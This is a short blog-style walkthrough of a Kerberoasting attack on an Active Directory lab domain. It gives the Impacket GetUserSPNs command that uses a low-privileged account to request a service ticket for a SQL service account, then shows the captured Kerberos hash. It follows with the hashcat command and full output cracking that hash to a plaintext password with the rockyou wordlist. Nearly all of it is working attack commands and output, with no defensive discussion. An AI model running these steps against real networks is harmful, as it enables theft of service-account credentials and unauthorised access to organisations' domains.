---
layout: post
title: Kerberoasting - Impacket
description: Kerberoasting - Impacket
summary: Kerberoasting - Impacket
tags: [windows,ad,kerberos,foothold]
minute: 1
---
## Environment Setup
* Needs a low privileged account and credentials

## Steps
* Fire up `getuserspns.py` to intercept a TGS. This tool is still part of impacket toolkit.

```bash
$ impacket-GetUserSPNs home.local/fcastle:Password1 -dc-ip 192.168.18.25 -request
/home/kali/.local/lib/python2.7/site-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  CryptographyDeprecationWarning,
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName            Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
dc/SQLService.home.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=home,DC=local  2020-09-21 20:39:28.042702  <never>               

$krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.home.local~60111*$adf93e5eda682b7db85dbd12947dd18a$ec689dadf6fa1a1d278af9292df3e4bedd69c898e443cc7bcae926b0732d708ad8c50c0ba0d398fe59c4b769429384804903a4753c41f1ba2a63e4b561a96096b72d0e2a330bb78001a889163b557964506304273f06f6a1c55e7146e94a53800e49b999bc921416d1d8e8496a2869a2fba3956770b5992562c6ab0406c4a4c5ab69f274cceddcfb191631b5ba968f060c4b17fd44b72e13a734bb9086d6fa440cad248d0622ac516b93abcdb3c879b587b952eeb84565a890fdd164975270d8538d5c2a482d50fb81b15bc4d35e87e53fb6be89732c2ba1ce8b628884c0e525c919ddfc8067250b6c0b8e53e7a3a2f50d873cfe5aa5e4e71e2ca430ccf85b184b2ae13ced1121b0b732c3319c93ba051ec792d6357469229df7e321262e3094ac7054d432c19de069d651a385d7f003d28bca53f05a23b33b475903a5ac6b29cebda56cee8f21b2864261d32d32b9629437a9430b24926de3cb0c699ae1b815f90a873e1a22be1ff2c416d5cbae0dd5582f7f11f3807f1410ac8236ed30907265f5f70afbd5ef912440faa13b97673f65ce42fca939715114cdec7afd51c2e92b487020d7351cc10a59bccb55285d2822a32d0fdf51414e1085c79be0316f0713b6b9df7f58115102e21ba4bcfe74639c47e67237e2fdf6fb7afe63922a3a187b7028e97ce63acc1ec93414e78108c5665207809e220c3af6d4a7b7da50cb086f6608e0bd456d2ebaedf403682b407fffdba4844d32df6df5143d8c2cf5ee2d862828c71350ac5485c06abe1dbfd46d017b4d38a1afe008284a1f48b242b7156805ec8b3c9fc4ccbad29ef2818ad8d299db6c034f9817bb4ff40b30a26fa3c23c1e72e8c54ebb709e811a0e919b08b1635a92fb63e500fb09d3d792a97cb0736965d2181e211dd2c14d1fba0701bb28b063af8639e5d60c801f198c1290498f0365c9c4b00cc20257646c76be2d31ada0ca17d305169a182e16417b3e6cbe5f125142915632920129865ea5169fc8396313457a23061a55d3be9b2ff1ca976de6f512e056c4ebbdfe9ef3d2fdb2ccd5d3f9dc5fb31e689b23e04b2b6b8b95bb7ccaddd8a1346b1c354460cbb004ac228082a38d35d830f0979a72fe54c09b6605a01899bdb616668c52702e3b0bc77efcaa2c333c43f72fa7ba12cdf56ae36abd9bcc3cac8c987b21545c234ef92c6346f677a1cb80a11d50beec2c180311e1a99bc60cdaf8495f26c986827cf3060847b830ae7231942bacb6c0965954d09756e6ec16381812d651dbec5dccc79de0e834
```

* Copy that entire hash and use `hashcat` to crack it.

```bash
$ hashcat --help | grep Kerb
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
$ hashcat -m 13100 tgtkrbhash.txt /usr/share/wordlists/rockyou.txt -O
hashcat (v6.0.0) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2870/2934 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 99 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

# password at the end
$krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.home.local~60111*$a8e8ff9ef784cc428504d5fa734796df$b75a36390a057bd909525915c24216b75024cea26b541943fae1a8341a4e4e753e4659d0be682c16b310eb6698e043ea6e7ebd2d8ca967b3c7c22dacdc0e0ab3b130a7f7f13cb05464e83d9848f95815f0923cfe2a9c23ecce605bc5b1f64b7230d6392a56eaa3a9e6a25a892367438caa2bb0c9a6c4e07595cf3732d2387c63404f9b4c82a9e397df23003eac337310921bef71405e451d45e2ac28d2e74327ddb59e964f779234d357a69baab1fd396df0905a3be7d6994863545db67c8ee7529575bf9e36122529121f9810d3c45971b8fad5458bc89c3a75a6d4c8b5a780d73dff97a9c05adf7e3a16296a3fbc4e95a72c22c82fac52a78d620fca278c2300478ad497b9da7ec6441cddd2dcf2a85490778c38a39045e40adf2b68462cb207d20783b7f55d6da5a180643195a2c15c167a4d33b12ce1faf554f78278b6b35317cf7916e71c2ab1e0f751698da8fdd408403510b299627fb18b47f41dca44361f8b1ecdc2d8ee66529d5de6a278e5f255087a48b013fc40c88d18a4ab5f1fc3a0a39efd2efefe56e1a6a214d2f16f2c8dad8142c64cefc2e87df93f0c0081d6a1847a32ef837d3f91f3990214eb0b52a3a97aaeec8b2fa94f67e6089898947ad322aba3a32bb0ae838bea385e1ac4cd11e8935052de12c453c4eafce5af50e6f5b9d92e238238ae9b82f995c9e4fda6c3434d925ab47a10e649d1ce02f50f04ca3f051e0c46f4ec24f3c7c1c412617cabd749ed4bf9ed50b93a1497b15a332fd4364c66c07627455a1fe0f45d47af5810f54fe4d25e2eff8655c8e071ecaeea7013608935cc5830d4607d50af5bccd0d44ac66e13911df0af182359ae0ceee20b48aeb8dbca6bac9497b1b4bb70e297b1b0f180d1a3eeca34a2cd4bde849515950ae7faa6fbccdb9b31a1db2826d185ee79d98f64c79c50ab04ca0f90e97db86e9740a782bfab7e500518f894fb162e9c4edaa480c829792e1d4ae72a2876ed34d9e3cba8a03618eba10d0f94e5b7d467cc130851d592ebde3fac06431e6b8500fadc066e79c5975f597af53457c1bbfc13b5781512935af00f9d826400916786bfacefb8aa62b2584a09ff3f33259f896ef4f716a9795af623197c59045ef4f8e64f73dbef6fa0beb043fe72dcc0cb2aaa5f1150e8ff40ad7c3f52a7af5dc86eeb24405c86f14aa8e54538419a19db470a8ba744e0ec3682e3217dbf8f4c6e09f37fcffa14dcbbf215e43ae8a7e609e86990cce06ea95d4c076adc636b7a462b9a6780acf583a1ee826039bf3b60135b:MYpassword123#
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.ho...60135b
Time.Started.....: Thu Oct  1 13:12:55 2020 (16 secs)
Time.Estimated...: Thu Oct  1 13:13:11 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   698.8 kH/s (8.40ms) @ Acceppsel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10848312/14344385 (75.63%)
Rejected.........: 2104/10848312 (0.02%)
Restore.Point....: 10840120/14344385 (75.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Mamita01 -> MY2girlS

Started: Thu Oct  1 13:12:54 2020
Stopped: Thu Oct  1 13:13:11 2020
```
